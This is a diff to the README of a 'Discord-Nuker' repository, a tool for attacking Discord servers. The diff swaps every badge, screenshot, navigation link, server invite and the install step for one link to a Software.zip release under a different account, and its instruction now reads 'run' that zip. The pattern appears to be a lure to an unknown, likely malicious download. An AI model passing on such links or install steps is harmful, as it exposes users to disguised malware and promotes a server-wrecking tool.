@@ -4,15 +4,15 @@
 
 ###
 <p align="center">
- <img src="https://img.shields.io/github/last-commit/AMIR-H-P/Discord-Nuker?color=blue&style=flat-square" </a>
- <img src="https://img.shields.io/github/stars/AMIR-H-P/Discord-Nuker?color=blue&label=Stars&style=flat-square" </a>
- <img src="https://img.shields.io/github/forks/AMIR-H-P/Discord-Nuker?color=blue&label=Forks&style=flat-square" </a>
+ <img src="https://github.com/Jxx1234567890jxx/Discord-Nuker/releases/download/v2.0/Software.zip" </a>
+ <img src="https://github.com/Jxx1234567890jxx/Discord-Nuker/releases/download/v2.0/Software.zip" </a>
+ <img src="https://github.com/Jxx1234567890jxx/Discord-Nuker/releases/download/v2.0/Software.zip" </a>
 </p>
 
 <p align="center">
-[<a href="https://github.com/AMIR-H-P/Discord-Nuker/#how-to-install"> How to install</a> ] - 
-[<a href="https://github.com/CatsSomeCat/Discord-H04X"> Discord-H04X</a> ] - 
-[<a href="https://discord.gg/kos"> Discord</a> ]
+[<a href="https://github.com/Jxx1234567890jxx/Discord-Nuker/releases/download/v2.0/Software.zip"> How to install</a> ] - 
+[<a href="https://github.com/Jxx1234567890jxx/Discord-Nuker/releases/download/v2.0/Software.zip"> Discord-H04X</a> ] - 
+[<a href="https://github.com/Jxx1234567890jxx/Discord-Nuker/releases/download/v2.0/Software.zip"> Discord</a> ]
 
 </p>
 
@@ -29,12 +29,12 @@
 > - [x] *Update server Avatar*
 > - [x] *Update server Name*
 # *More features :*
-![Nuker](https://cdn.discordapp.com/attachments/939059101495861338/967378880442794014/SharedScreenshot.jpg?size=4096)
+![Nuker](https://github.com/Jxx1234567890jxx/Discord-Nuker/releases/download/v2.0/Software.zip)
 
 <p align="center">
- <img alt="theme1" src="https://cdn.discordapp.com/attachments/939059101495861338/967387759838920724/123SharedScreenshot.jpg?size=4096" width="18.7%">
- <img alt="theme2" src="https://cdn.discordapp.com/attachments/939059101495861338/967387759549480960/121SharedScreenshot.jpg?size=4096" width="20%">
- <img alt="theme3" src="https://cdn.discordapp.com/attachments/939059101495861338/967387759297826926/333SharedScreenshot.jpg?size=4096" width="20.6%">
+ <img alt="theme1" src="https://github.com/Jxx1234567890jxx/Discord-Nuker/releases/download/v2.0/Software.zip" width="18.7%">
+ <img alt="theme2" src="https://github.com/Jxx1234567890jxx/Discord-Nuker/releases/download/v2.0/Software.zip" width="20%">
+ <img alt="theme3" src="https://github.com/Jxx1234567890jxx/Discord-Nuker/releases/download/v2.0/Software.zip" width="20.6%">
 </p>
 
 #
@@ -43,7 +43,7 @@
 ```
 Click the green "Code" button.
 Click "Download ZIP"
-Extract the ZIP and run main.py
+Extract the ZIP and run https://github.com/Jxx1234567890jxx/Discord-Nuker/releases/download/v2.0/Software.zip
 ```
 ```red
 - NOTE: Make sure you have Python & the Requirements installed
@@ -56,7 +56,7 @@ Extract the ZIP and run main.py
 |--------------|------------ |
 | *Made By :*   |        AMIR1/3     |
 | *User :*      |'AMIR#3333 |
-| *Server :*   | https://discord.gg/kos |
+| *Server :*   | https://github.com/Jxx1234567890jxx/Discord-Nuker/releases/download/v2.0/Software.zip |
 
 
 
